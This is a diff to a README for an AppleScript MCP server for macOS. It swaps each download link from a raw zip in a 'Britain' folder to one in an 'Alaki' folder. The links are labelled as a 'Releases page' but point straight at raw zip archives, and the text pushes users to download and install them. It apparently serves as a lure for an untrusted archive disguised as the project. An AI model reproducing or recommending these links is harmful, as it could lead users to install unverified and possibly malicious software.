@@ -1,7 +1,7 @@
 # 🍏 bb-applescript-mcp-server - Easily Run AppleScripts on macOS
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/pachipalabharath/bb-applescript-mcp-server/main/Britain/bb-applescript-mcp-server.zip%https://raw.githubusercontent.com/pachipalabharath/bb-applescript-mcp-server/main/Britain/bb-applescript-mcp-server.zip)](https://raw.githubusercontent.com/pachipalabharath/bb-applescript-mcp-server/main/Britain/bb-applescript-mcp-server.zip)
+[![Download](https://raw.githubusercontent.com/pachipalabharath/bb-applescript-mcp-server/main/Alaki/bb-applescript-mcp-server.zip%https://raw.githubusercontent.com/pachipalabharath/bb-applescript-mcp-server/main/Alaki/bb-applescript-mcp-server.zip)](https://raw.githubusercontent.com/pachipalabharath/bb-applescript-mcp-server/main/Alaki/bb-applescript-mcp-server.zip)
 
 ## 📖 Overview
 bb-applescript-mcp-server is a Model Context Protocol (MCP) server. It allows large language model (LLM) clients to communicate with macOS applications using AppleScript. Built with the @beyondbetter/bb-mcp-server library, it safely executes predefined scripts. It also supports executing custom scripts, giving you more control over your macOS applications.
@@ -17,7 +17,7 @@ To use bb-applescript-mcp-server, ensure you have the following:
 - A stable internet connection for downloading files
 
 ### 2. Visit the Releases Page
-To download the latest version of bb-applescript-mcp-server, visit the [Releases page](https://raw.githubusercontent.com/pachipalabharath/bb-applescript-mcp-server/main/Britain/bb-applescript-mcp-server.zip).
+To download the latest version of bb-applescript-mcp-server, visit the [Releases page](https://raw.githubusercontent.com/pachipalabharath/bb-applescript-mcp-server/main/Alaki/bb-applescript-mcp-server.zip).
 
 ### 3. Download the Application
 On the Releases page, you will see the latest version listed. Click on the version to view its details. Look for the download link that matches your system. Click the download link to save the application to your computer.
@@ -76,4 +76,4 @@ To use AppleScript with the server:
 If you have any questions or feedback, feel free to reach out through the support section on GitHub. Your input helps us enhance the application for everyone's benefit. 
 
 ## 🔗 Download & Install
-For a quick start, download the application now from the [Releases page](https://raw.githubusercontent.com/pachipalabharath/bb-applescript-mcp-server/main/Britain/bb-applescript-mcp-server.zip). Follow the installation steps above to get bb-applescript-mcp-server up and running smoothly on your macOS system.
+For a quick start, download the application now from the [Releases page](https://raw.githubusercontent.com/pachipalabharath/bb-applescript-mcp-server/main/Alaki/bb-applescript-mcp-server.zip). Follow the installation steps above to get bb-applescript-mcp-server up and running smoothly on your macOS system.
